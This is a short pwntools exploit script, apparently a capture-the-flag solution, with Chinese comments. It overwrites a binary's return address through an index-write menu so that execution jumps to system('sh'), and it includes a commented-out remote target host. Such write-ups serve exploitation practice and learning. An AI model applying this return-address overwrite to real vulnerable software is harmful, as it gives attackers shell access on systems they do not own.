from pwn import *

context.log_level = 'DEBUG'

p = process('../file/3fb1a42837be485aae7d85d11fbc457b')
# p = remote('61.147.171.105', '60149') # 远端服务器没有/bin/bash

input('continue?')

p.sendlineafter(b'have:\n', b'1')
p.recvline()
p.sendline(b'2')

def changeNumber(offset, value):
    p.sendlineafter(b'exit\n', b'3')
    p.sendlineafter(b'change:\n', str(offset).encode())
    p.sendlineafter(b'number:\n', str(value).encode())

# 本地方案：往返回地址写入hackhere函数的地址0x0804859b，通过调试得知返回地址的偏移量为0x84~0x88
# changeNumber(0x84, 0x9b)
# changeNumber(0x85, 0x85)
# changeNumber(0x86, 0x04)
# changeNumber(0x87, 0x08)

'''
远程方案：
    由于服务器上没有/bin/bash，因此需要调用system('sh')才能成功
    system的plt地址为0x08048450
    sh字符的地址为0x08048987
    修改跳转地址为system_plt，修改第一个参数为sh字符地址
'''
changeNumber(0x84, 0x50)
changeNumber(0x85, 0x84)
changeNumber(0x86, 0x04)
changeNumber(0x87, 0x08)

changeNumber(0x8c, 0x87)
changeNumber(0x8d, 0x89)
changeNumber(0x8e, 0x04)
changeNumber(0x8f, 0x08)

p.sendlineafter(b'exit\n', b'5')

p.interactive()